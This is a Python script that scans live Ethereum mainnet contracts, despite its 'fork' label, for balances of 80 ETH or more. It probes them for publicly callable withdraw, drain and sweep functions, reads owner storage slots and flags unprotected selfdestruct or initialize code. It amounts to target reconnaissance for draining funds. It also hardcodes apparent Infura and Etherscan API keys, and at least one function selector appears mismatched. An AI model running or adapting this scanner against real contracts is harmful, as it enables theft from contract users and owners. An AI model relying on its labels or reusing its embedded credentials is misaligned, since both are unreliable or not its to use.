#!/usr/bin/env python3
"""
Mainnet Fork Exploit Testing
Actually attempt exploits on fork, not just pattern detection
"""
import json
import subprocess
import time

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
ETHERSCAN_API = "5UWN6DNT7UZCEJYNE3J6FCVAWH4QJW255K"

def rpc_call(method, params):
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    cmd = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
           "-d", json.dumps(payload), RPC]
    result = subprocess.run(cmd, capture_output=True, text=True)
    try:
        return json.loads(result.stdout)
    except:
        return None

def eth_call(to, data, block="latest", value="0x0"):
    return rpc_call("eth_call", [{"to": to, "data": data, "value": value}, block])

def get_balance(addr):
    result = rpc_call("eth_getBalance", [addr, "latest"])
    if result and 'result' in result:
        return int(result['result'], 16) / 1e18
    return 0

def get_storage(addr, slot):
    result = rpc_call("eth_getStorageAt", [addr, slot, "latest"])
    if result and 'result' in result:
        return result['result']
    return None

def get_code(addr):
    result = rpc_call("eth_getCode", [addr, "latest"])
    if result and 'result' in result:
        return result['result']
    return "0x"

def estimate_gas(to, data, from_addr="0x0000000000000000000000000000000000000001", value="0x0"):
    result = rpc_call("eth_estimateGas", [{"to": to, "data": data, "from": from_addr, "value": value}])
    return result

def get_source(addr):
    url = f"https://api.etherscan.io/v2/api?chainid=1&module=contract&action=getsourcecode&address={addr}&apikey={ETHERSCAN_API}"
    result = subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    try:
        data = json.loads(result.stdout)
        if data.get("status") == "1" and data.get("result"):
            return data["result"][0]
        return None
    except:
        return None

# Load contracts
with open("contracts.txt", "r") as f:
    contracts = [line.strip() for line in f if line.strip().startswith("0x")]

print("=" * 80)
print("MAINNET FORK EXPLOIT TESTING")
print("=" * 80)

# Get balances and find high-value targets
print("\n[1] Finding high-value targets...")
targets = []
for addr in contracts[:100]:  # First batch
    bal = get_balance(addr)
    if bal >= 80:
        targets.append({"address": addr, "balance": bal})

targets.sort(key=lambda x: x['balance'], reverse=True)
print(f"Found {len(targets)} contracts with 80+ ETH")

# Analyze each target for specific exploit vectors
for target in targets[:30]:
    addr = target['address']
    balance = target['balance']

    print(f"\n{'='*60}")
    print(f"[TARGET] {addr}")
    print(f"[BALANCE] {balance:.2f} ETH")
    print("="*60)

    time.sleep(0.3)

    # Get source
    source_data = get_source(addr)
    if not source_data:
        print("  No verified source - checking bytecode patterns...")
        code = get_code(addr)
        if len(code) < 100:
            print("  Proxy or minimal contract")
        continue

    name = source_data.get("ContractName", "Unknown")
    src = source_data.get("SourceCode", "")

    print(f"  Contract: {name}")

    # Parse multi-file
    if src.startswith("{{"):
        try:
            src_json = json.loads(src[1:-1])
            sources = src_json.get("sources", {})
            src = "\n".join([v.get("content", "") for v in sources.values()])
        except:
            pass
    elif src.startswith("{"):
        try:
            src_json = json.loads(src)
            sources = src_json.get("sources", {})
            src = "\n".join([v.get("content", "") for v in sources.values()])
        except:
            pass

    # ACTUAL EXPLOIT TESTING

    # Test 1: Check for unprotected functions
    print("\n  [TEST 1] Checking for callable value-extraction functions...")

    # Common withdrawal selectors
    selectors = {
        "withdraw()": "0x3ccfd60b",
        "withdrawAll()": "0x853828b6",
        "drain()": "0x9890220b",
        "emergencyWithdraw()": "0xdb2e21bc",
        "claimRewards()": "0x372500ab",
        "exit()": "0xe9fad8ee",
        "withdrawETH()": "0xf14210a6",
        "sweep()": "0x01681a62",
        "collect()": "0x06fdde03",
    }

    for func_name, selector in selectors.items():
        try:
            result = eth_call(addr, selector)
            if result and 'result' in result and result['result'] != '0x':
                print(f"    [!] {func_name} returned: {result['result'][:66]}")

            # Try estimate gas (see if function is callable)
            gas_result = estimate_gas(addr, selector)
            if gas_result and 'result' in gas_result:
                gas = int(gas_result['result'], 16)
                if gas < 1000000:  # Reasonable gas
                    print(f"    [!!] {func_name} is CALLABLE - gas: {gas}")
        except:
            pass

    # Test 2: Check for payable functions that might be exploitable
    print("\n  [TEST 2] Checking payable functions...")

    payable_selectors = {
        "deposit()": "0xd0e30db0",
        "mint()": "0x1249c58b",
        "buy()": "0xa6f2ae3a",
        "stake()": "0x3a4b66f1",
    }

    for func_name, selector in payable_selectors.items():
        try:
            # Try with small value
            gas_result = estimate_gas(addr, selector, value="0x1")
            if gas_result and 'result' in gas_result:
                gas = int(gas_result['result'], 16)
                if gas < 500000:
                    print(f"    [+] {func_name} accepts ETH - gas: {gas}")
        except:
            pass

    # Test 3: Check storage for ownership/initialization
    print("\n  [TEST 3] Checking storage patterns...")

    # Slot 0 often contains owner or important state
    slot0 = get_storage(addr, "0x0")
    slot1 = get_storage(addr, "0x1")

    if slot0:
        print(f"    Slot 0: {slot0}")
        # Check if it looks like an address
        if slot0 != "0x0000000000000000000000000000000000000000000000000000000000000000":
            if len(slot0) == 66 and slot0[2:26] == "0" * 24:
                potential_owner = "0x" + slot0[26:]
                print(f"    Potential owner address: {potential_owner}")

    if slot1:
        print(f"    Slot 1: {slot1}")

    # Test 4: Look for specific vulnerable patterns in source
    if src:
        print("\n  [TEST 4] Source code analysis...")

        # Check for selfdestruct without proper protection
        if "selfdestruct" in src.lower():
            # Find the function containing selfdestruct
            lines = src.split('\n')
            for i, line in enumerate(lines):
                if "selfdestruct" in line.lower():
                    context_start = max(0, i-5)
                    context_end = min(len(lines), i+3)
                    context = '\n'.join(lines[context_start:context_end])
                    if "onlyowner" not in context.lower() and "require" not in context.lower():
                        print(f"    [!!!] SELFDESTRUCT possibly unprotected at line {i+1}")

        # Check for initialize functions
        if "initialize" in src.lower():
            if "initializer" not in src.lower() and "initialized" not in src.lower():
                print(f"    [!] Has initialize() without initializer modifier")

        # Check for approval patterns
        if "approve(" in src and "type(uint256).max" in src:
            print(f"    [!] Uses infinite approvals")

print("\n" + "=" * 80)
print("FORK TESTING COMPLETE")
print("=" * 80)
